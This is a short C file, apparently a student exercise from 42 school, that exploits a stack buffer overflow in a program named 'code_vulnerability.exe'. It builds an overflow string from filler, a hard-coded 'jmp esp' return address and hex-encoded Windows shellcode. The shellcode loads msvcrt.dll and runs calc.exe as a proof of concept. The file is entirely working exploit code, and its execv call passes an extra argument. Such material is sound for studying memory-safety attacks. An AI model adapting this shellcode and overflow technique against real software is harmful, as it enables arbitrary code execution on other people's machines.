/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tsunami.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cherrero <cherrero@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/03 11:21:53 by cherrero          #+#    #+#             */
/*   Updated: 2023/05/10 17:04:08 by cherrero         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main ()
{
    char *argv[3];

    char	shellcode[] = "\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3";
    char	jmp_esp[] = "\x7b\x46\x86\x7c";
    char	buffer[1024] = "11111111111111111111111111111111111111111111111111111111111111111111";

    strcat(buffer, jmp_esp);
    strcat(buffer, shellcode);

    argv[0] = "code_vulnerability.exe";
    argv[1] = buffer;
    argv[2] = NULL;

    execv("code_vulnerability.exe", argv, NULL);

    return 0;
}
